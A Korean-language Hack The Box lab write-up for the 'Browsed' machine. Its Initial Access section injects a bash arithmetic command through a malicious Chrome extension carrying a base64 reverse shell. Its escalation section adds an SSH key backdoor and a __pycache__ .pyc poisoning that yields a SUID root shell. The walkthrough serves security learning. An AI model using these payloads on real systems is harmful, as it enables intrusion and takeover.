# HTB-BROWSED
```bash
OS: Linux
DATE: 26.09.09
DIFFICULTY: Medium
```

## RECON
**nmap**: 전체 포트 검사 이후 상세 포트를 검사했다. 검사 결과 22(SSH), 80(HTTP) 서비스가 실행 중인 것을 알게 되었다.
```bash
nmap -p- -T4 IP
nmap -sC -sV -p 22,80 IP
```

**ffuf**: 웹 서비스에 웹 디렉토리와 서브도메인 RECON을 시도했지만 특별한 것은 없었다.
```bash
ffuf -u http://browsed.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```
```bash
ffuf -u http://browsed.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -c -r -H "Host:FUZZ.browsed.htb" -fs 6708
```

## Initial Access
초기 접근을 위해 웹 서비스에 접근한 결과 `chrome extension zip`을 업로드할 수 있는 프로그램이 있었고, Output에서 내부 디버그 로그들이 나오고 있었다. 따라서 `/sample.html`에서 fontify.zip을 다운로드받아 업로드한 후 output을 복사하여 분석해본 결과, `browsedinternals.htb`라는 내부 호스트 이름을 찾을 수 있었다.
```txt
current?cup2key=8:xauSRKKHNFthMUuhS7hsQEESp6uPWE70LlRytxjugOA&cup2hreq=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
[1760:1764:0910/074717.605395:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/
[1760:1764:0910/074717.605894:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/
[1760:1764:0910/074717.606156:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser&json=standard
[1730:1730:0910/074717.620148:VERBOSE1:component_installer.cc(560)] FinishRegistration for Widevine Content Decryption Module
```
따라서 /etc/hosts에 도메인을 추가하여 접속했다.
```bash
sudo nano /etc/hosts
```
대상 도메인에서는 gitea라는 서비스가 실행 중이었다. 그리고 larry라는 유저의 `MarkdownPreview`라는 REPO가 있었다. 안에는 개발자 로컬 5000포트에서 동작 중인 웹 서비스 소스가 있었다. app.py 소스를 읽어보니 `/routines/<rid>`가 ./routines.sh를 실행한다는 것을 알게 되었다.
```python
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```
```bash
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
  log_action "Routine 1: Data backed up to $BACKUP_DIR."
  echo "Backup completed."

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
  log_action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  log_action "Routine 3: System info dumped."
  echo "System info saved."

else
  log_action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi
```
소스 코드를 확인해보니 routines.sh에 command injection 취약점이 있다는 것을 알게 되었다.

- **command injection 원리**: `if [[ "$1" -eq 0 ]]; then`라는 코드에서 $1은 입력할 수 있는 값이고, `-eq`에 취약한 점이 있었다. `-eq`는 숫자 비교 연산자이다. 그런데 bash는 `-eq`로 뭔가를 비교할 때, 양쪽 값을 단순히 정수로 읽는 게 아니라 "산술 표현식"으로 계산하려고 한다. 산술 표현식이란 `3+2` 같은 계산 수식이다. 그래서 bash가 이 값을 숫자로 만들려고 계산하는데, 바로 이때 bash에서 괄호 안의 명령을 실행하고 그 결과로 치환하라는 뜻이 있다. 그래서 `x[$(명령)]`을 넣으면 인덱스를 계산하는 과정에서 해당 명령어를 실행하게 된다.

따라서 `id`로 확인해본 결과 command injection이 실제로 취약하다는 것을 확인할 수 있었다.
```bash
./routine.sh 'x[$(id)]'
(root)
```
취약한 라우틴 실행 엔드포인트는 대상의 로컬호스트(127.0.0.1:5000)에만 바인딩되어 있어, 공격자 머신에서 직접 요청을 보낼 수 없었다. 따라서 대상 내부에서 해당 엔드포인트에 접근할 수 있는 경로를 찾아야 했다. 앞선 정찰에서 업로드된 크롬 확장을 개발자가 자동으로 로드·테스트한다는 점을 확인했으므로, 이를 이용해 대상 내부의 브라우저가 대신 요청을 보내도록 하는 방식을 택했다. 악성 확장은 Manifest V3 규격으로 작성했다. V3에서는 백그라운드 스크립트가 service worker로 동작하며, 확장이 로드되거나 초기화될 때 자동으로 실행된다. 따라서 manifest.json과 페이로드를 담은 background.js를 작성하고, 두 파일을 아카이브 최상위에 두어 zip으로 패키징했다. 개발자가 이 확장을 로드하는 순간 service worker가 실행되어, 대상 내부에서 취약한 엔드포인트로 요청이 전달되고 명령이 실행된다.

- **악성코드**: 악성코드는 리버스 쉘을 base64로 인코딩하여, JS로 커맨드 인젝션을 함께 활용해 작성했다.
```js
// background.js
function onExtensionLoaded() {
  const b64 = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy85MDAxIDA+JjE=";
  const rid = "x[$(echo " + b64 + "|base64 -d|bash)]";
  fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent(rid));
}
onExtensionLoaded();
```
```bash
zip pwn.zip manifest.json background.js
```
따라서 zip으로 패키징한 파일을 업로드하고 리스닝을 켜둔 결과 larry 유저 쉘에 접근할 수 있었다.
![User](attach_real/Pasted%20image%2020260910172759.png)

## Privilege Escalation
처음 쉘에 접근하고 `sudo -l`을 실행해본 결과 NOPASSWD root 권한으로 /opt/extensiontool/extension_tool.py 프로그램이 실행된다는 것을 알게 되었다. 따라서 코드를 확인하기 전에 더 편한 접근을 위해 SSH 백도어를 심어두었다. 내 컴퓨터에서 ssh-keygen을 활용하여 ssh.pub을 보내주고 접속이 가능했다.
```bash
(kali)
ssh-keygen -t rsa -f /tmp/browsed
```
```bash
(larry)
echo 'ssh-ed25519 AAAA...여기에_복사한_공개키_전체... kali@kali' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
```bash
(kali)
ssh -i /tmp/browsed larry@IP
``` 
이후 다시 /opt/extensiontool/extension_tool.py 코드를 읽기 시작했다. 대상 코드는 extension_utils.py 라이브러리를 불러오고, 그 라이브러리가 바이트코드로 컴파일되어 `__pycache__`라는 폴더에 저장되는 것을 알게 되었다.

- **pycache란**: Python은 컴파일이 없는 언어인 줄 알았지만, 실제로는 내부에서 소스를 바이트코드라는 중간 형태로 번역한 뒤 실행한다. 그리고 import되는 모듈은 이 바이트코드를 매번 다시 번역하지 않으려고 파일로 캐싱해둔다. 그게 `.pyc` 파일이고 `__pycache__` 폴더에 저장된다. 여기서 **중요**한 점은 직접 실행되는 메인 스크립트는 캐시되지 않고 import되는 모듈만 캐시된다는 점이다. 그래서 extension_tool의 .pyc는 없고 extension_utils의 .pyc만 있다.

결론적으로 어떤 것이 취약했냐면, `__pycache__` 폴더가 누구나 쓰기 가능한 World-Writable이라는 것이었다. 따라서 메인 스크립트는 고치지 못했지만, Python이 실제로 실행하는 코드는 캐시된 .pyc이기 때문에 **악성코드를 컴파일한 가짜 `.pyc`를 만들어서 그 폴더에 덮어쓰면** 권한 상승이 가능했다.

따라서 구글링해본 결과 [Python __pycache__ Poisoning Privilege Escalation (UNCHECKED_HASH)](https://dollarboysushil.com/posts/python-pycache-poisoning-privilege-escalation/) 를 참고하여 exploit.py 코드를 만들고, 기존 extension_utils.py를 권한 상승 코드로 수정한 후 권한 상승에 성공했다.
```python
(/tmp/exploit.py)
import py_compile
from py_compile import PycInvalidationMode

py_compile.compile(
    "/tmp/extension_utils.py",
    cfile="/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc",
    invalidation_mode=PycInvalidationMode.UNCHECKED_HASH
)

print("[+] Unchecked-hash pyc generated successfully")
```
```python
(/tmp/extension_utils.py)
import os
import json
import subprocess
import shutil
from jsonschema import validate, ValidationError

MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name": {"type": "string"},
        "version": {"type": "string"},
        "permissions": {"type": "array", "items": {"type": "string"}},
    },
    "required": ["manifest_version", "name", "version"]
}

def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:")
        print(e.message)
        exit(1)

def clean_temp_files(extension_dir):
    """ Clean up temporary files or unnecessary directories after packaging """
    os.system("cp /bin/bash /tmp/rootbash")
    os.system("chmod 4777 /tmp/rootbash")

    temp_dir = '/opt/extensiontool/temp'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[+] Cleaned up temporary directory {temp_dir}")
    else:
        print("[+] No temporary files to clean.")
    exit(0)
```
이렇게 코드를 수정한 후 `/tmp/exploit.py`를 실행한 결과 `__pycache__`에 잘 저장된 것을 확인할 수 있었다.
```bash
python3 /tmp/exploit.py
```
```bash
sudo /opt/extensiontool/extension_tool.py --clean
```
```bash
/tmp/rootbash -p 
```
이를 통해 root로 권한 상승에 성공할 수 있었다.
![root](attach_real/Pasted%20image%2020260910180822.png)

## New Inform
- 처음 보는 개념이 있으면 항상 어떤 구조인지, 메인이 뭔지 잘 파악한 후 검색하자.
- 로그를 끈질기게 분석하자.
- `-eq`가 취약할 수 있는 연산자라는 것을 알게 되었다.
- `__pycache__`에 대해서 자세히 알게 되었다.